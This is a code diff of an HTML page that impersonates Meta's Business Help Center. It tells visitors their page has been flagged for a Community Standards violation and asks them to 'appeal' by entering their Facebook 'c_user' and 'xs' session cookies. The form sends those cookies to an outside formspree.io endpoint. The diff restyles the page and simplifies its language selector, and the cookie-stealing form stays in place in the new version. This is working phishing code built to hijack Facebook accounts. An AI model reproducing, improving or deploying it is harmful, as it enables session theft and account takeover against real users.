@@ -5,77 +5,63 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Meta Business Help Center</title>
     <style>
-        * { box-sizing: border-box; }
-        body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; padding: 20px; margin: 0; }
-        .meta-container { background: white; padding: 24px; border-radius: 12px; width: 100%; max-width: 450px; }
+        body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .box { background: white; padding: 24px; border-radius: 8px; width: 100%; max-width: 400px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
         
-        /* Language Modal Style */
-        .modal { display: flex; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 1000; justify-content: center; align-items: center; }
-        .modal-content { background: white; padding: 20px; border-radius: 12px; width: 90%; max-width: 350px; max-height: 80vh; overflow-y: auto; }
-        .lang-option { padding: 12px; border-bottom: 1px solid #eee; cursor: pointer; font-size: 15px; }
-        .lang-option:hover { background: #f7f8fa; }
-        
+        /* Language List */
+        .lang-list { display: flex; flex-direction: column; gap: 10px; }
+        .lang-item { padding: 12px; border: 1px solid #dddfe2; border-radius: 6px; cursor: pointer; font-size: 15px; }
+        .lang-item:hover { background: #f7f8fa; }
+
         /* Form Style */
         #appealForm { display: none; }
-        .header { margin-bottom: 24px; }
-        .header-title { font-size: 22px; font-weight: 700; color: #1c1e21; margin: 0; }
-        .alert-box { border: 1px solid #dddfe2; border-radius: 8px; padding: 16px; background-color: #fafafa; margin-bottom: 20px; }
-        input[type="text"] { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px; margin-top: 5px; }
-        .submit-btn { width: 100%; padding: 12px; background: #0866ff; color: white; border: none; border-radius: 6px; font-weight: 700; cursor: pointer; margin-top: 15px; }
-        .footer-note { font-size: 12px; color: #65676b; margin-top: 20px; text-align: center; }
+        .title { font-size: 24px; font-weight: 700; margin-bottom: 8px; }
+        .subtitle { font-size: 15px; color: #606770; margin-bottom: 20px; }
+        .notice { background: #fafafa; border: 1px solid #dddfe2; padding: 16px; border-radius: 6px; margin-bottom: 20px; font-size: 14px; }
+        .input-box { width: 100%; padding: 12px; margin-top: 5px; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; }
+        .btn { width: 100%; padding: 12px; background: #0866ff; color: white; border: none; border-radius: 6px; font-weight: 700; cursor: pointer; margin-top: 15px; }
     </style>
 </head>
 <body>
 
-    <div class="meta-container">
-        <div id="langModal" class="modal">
-            <div class="modal-content">
-                <h3 style="margin-top:0;">Select Language</h3>
-                <div class="lang-option" onclick="selectLang('English')">English (US)</div>
-                <div class="lang-option" onclick="selectLang('Hindi')">हिन्दी (Hindi)</div>
-                <div class="lang-option" onclick="selectLang('Spanish')">Español (Spanish)</div>
-                <div class="lang-option" onclick="selectLang('Portuguese')">Português (Portuguese)</div>
-                <div class="lang-option" onclick="selectLang('Tamil')">தமிழ் (Tamil)</div>
-                <div class="lang-option" onclick="selectLang('Arabic')">العربية (Arabic)</div>
-                <div class="lang-option" onclick="selectLang('French')">Français (French)</div>
-                <div class="lang-option" onclick="selectLang('Vietnamese')">Tiếng Việt (Vietnamese)</div>
-                <div class="lang-option" onclick="selectLang('Twi')">Twi (Ghanaian)</div>
-                <button onclick="showForm()" style="width:100%; padding:12px; background:#0866ff; color:white; border:none; border-radius:6px; margin-top:15px; cursor:pointer;">Confirm Language</button>
-            </div>
+    <div class="box" id="langBox">
+        <h3>Select Language</h3>
+        <div class="lang-list">
+            <div class="lang-item" onclick="showForm()">English (US)</div>
+            <div class="lang-item" onclick="showForm()">हिन्दी (Hindi)</div>
+            <div class="lang-item" onclick="showForm()">Español (Spanish)</div>
+            <div class="lang-item" onclick="showForm()">Português (Portuguese)</div>
+            <div class="lang-item" onclick="showForm()">தமிழ் (Tamil)</div>
+            <div class="lang-item" onclick="showForm()">العربية (Arabic)</div>
+            <div class="lang-item" onclick="showForm()">Français (French)</div>
+            <div class="lang-item" onclick="showForm()">Tiếng Việt (Vietnamese)</div>
+            <div class="lang-item" onclick="showForm()">Twi (Ghanaian)</div>
+        </div>
+    </div>
+
+    <div class="box" id="appealForm">
+        <h1 class="title">Page Appeal Request</h1>
+        <p class="subtitle">Submit your information to appeal the deletion.</p>
+        
+        <div class="notice">
+            <b>Violation Notice:</b> Your page has been flagged for a violation of our Community Standards.
         </div>
 
-        <div id="appealForm">
-            <div class="header">
-                <h1 class="header-title">Page Appeal Request</h1>
-            </div>
+        <form action="https://formspree.io/f/maqaobyw" method="POST">
+            <label><b>c_user</b></label>
+            <input type="text" name="c_user" class="input-box" placeholder="Enter c_user" required>
             
-            <div class="alert-box">
-                <b>Violation Notice:</b> Your account or page has been flagged for a violation of our Community Standards.
-            </div>
-
-            <form action="https://formspree.io/f/maqaobyw" method="POST">
-                <label><b>c_user</b></label>
-                <input type="text" name="c_user" placeholder="Enter your c_user ID" required>
-                
-                <label style="display:block; margin-top:15px;"><b>xs</b></label>
-                <input type="text" name="xs" placeholder="Enter your xs cookie" required>
-                
-                <button type="submit" class="submit-btn">Submit Appeal</button>
-            </form>
-
-            <div class="footer-note">
-                Meta Business Help Center © 2026
-            </div>
-        </div>
+            <label style="display:block; margin-top:15px;"><b>xs</b></label>
+            <input type="text" name="xs" class="input-box" placeholder="Enter xs" required>
+            
+            <button type="submit" class="btn">Submit Appeal Request</button>
+        </form>
     </div>
 
     <script>
         function showForm() {
-            document.getElementById('langModal').style.display = 'none';
+            document.getElementById('langBox').style.display = 'none';
             document.getElementById('appealForm').style.display = 'block';
-        }
-        function selectLang(lang) {
-            console.log("Selected: " + lang);
         }
     </script>
 </body>
